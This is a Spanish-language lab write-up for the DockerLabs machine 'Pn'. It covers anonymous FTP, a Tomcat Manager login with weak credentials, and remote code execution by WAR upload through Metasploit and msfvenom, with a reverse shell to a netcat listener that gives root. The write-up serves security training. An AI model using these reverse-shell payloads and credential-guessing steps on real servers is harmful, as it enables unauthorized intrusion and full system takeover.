# Máquina: Pn — DockerLabs

**Dificultad:** Fácil  
**SO:** Unix  
**IP objetivo:** `172.17.0.2`  
**Técnicas:** FTP anónimo · Apache Tomcat credenciales por defecto · RCE via WAR upload

---

## Flujo del ataque

```
Ping → Nmap (FTP + Tomcat 8080) → FTP anónimo (tomcat.txt)
→ Tomcat Manager (tomcat:s3cr3t) → WAR upload → RCE → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.069 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.043 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux/Unix confirmado.

### Nmap

```bash
nmap -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

| Puerto   | Estado | Servicio | Versión              |
|----------|--------|----------|----------------------|
| 21/tcp   | open   | FTP      | vsftpd 3.0.5         |
| 8080/tcp | open   | HTTP     | Apache Tomcat 9.0.88 |

Nmap detecta login FTP anónimo habilitado y un archivo `tomcat.txt` expuesto.

---

## 2. FTP anónimo — Obtención de pista

```bash
ftp 172.17.0.2
# Name: Anonymous / Password: (vacía)
ftp> get tomcat.txt
```

```
cat tomcat.txt
Hello tomcat, can you configure the tomcat server? I lost the password...
```

El mensaje confirma que el servidor Tomcat no está correctamente configurado, lo que sugiere credenciales por defecto.

---

## 3. Apache Tomcat Manager — Credenciales por defecto

El puerto 8080 expone Apache Tomcat 9.0.88. Accediendo a `/manager/html` se solicita autenticación HTTP básica. Probando credenciales comunes en instalaciones sin configurar:

```
tomcat:s3cr3t   ← VÁLIDA
```

El Tomcat Web Application Manager queda accesible con control total, incluyendo la opción de subir y desplegar archivos WAR.

---

## 4. Explotación — RCE via WAR upload

Un archivo WAR (Web Application Archive) es el formato estándar para desplegar aplicaciones Java en Tomcat. Al subir un WAR malicioso y desplegarlo, Tomcat lo ejecuta creando una nueva ruta en el servidor que contiene la reverse shell.

### Método A — Metasploit

```bash
msfconsole
msf > use exploit/multi/http/tomcat_mgr_upload

set HttpUsername tomcat
set HttpPassword s3cr3t
set RHOSTS 172.17.0.2
set RPORT 8080
set LHOST 172.17.0.1
set LPORT 4343

run
```

```
[*] Meterpreter session 1 opened (172.17.0.1:4343 -> 172.17.0.2:54750)
meterpreter > shell

id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
script /dev/null -c bash
```

---

### Método B — Manual (msfvenom + netcat)

Generamos el WAR malicioso:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4343 -f war -o shell.war
```

`java/shell_reverse_tcp` genera un payload que ejecuta una reverse shell Java al ser invocado. El formato `-f war` lo empaqueta como aplicación Tomcat lista para desplegar.

En otra terminal, escuchamos con netcat:

```bash
nc -lnvp 4343
```

Subimos `shell.war` en el Tomcat Manager, hacemos deploy y accedemos a `/shell` desde el navegador:

```
Connection received on 172.17.0.2 50834

id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
script /dev/null -c bash
# root@54aaf0a2f18d:/#
```

---

## Credenciales

| Usuario | Contraseña | Método                       |
|---------|------------|------------------------------|
| tomcat  | s3cr3t     | Credenciales Tomcat por defecto |
| root    | —          | RCE via WAR upload           |

---

## Referencias

- [HackTricks — Apache Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Metasploit — tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
- [revshells.com](https://www.revshells.com/)
- [msfvenom cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
